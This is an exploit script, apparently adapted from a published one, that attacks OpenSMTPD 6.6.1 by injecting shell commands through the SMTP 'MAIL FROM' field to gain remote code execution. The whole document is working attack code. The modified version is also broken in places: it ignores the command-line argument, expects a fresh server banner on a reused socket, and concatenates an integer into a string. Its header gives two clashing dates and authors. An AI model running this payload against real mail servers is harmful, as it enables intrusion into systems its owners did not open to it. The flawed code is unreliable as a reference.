# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Date: 2022
# Author: Eric
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = ['sudo apt update', 'sudo apt install python3.8']

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))


for cmdnum in range(len(CMD)):
    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum) + "/ " + len(CMD))
    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        print('[!] No OpenSMTPD detected')
        print('[!] Received {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error connecting, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Connected, sending payload' + CMD[cmdnum])
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error sending payload, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Payload sent')
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    print('[*] Done')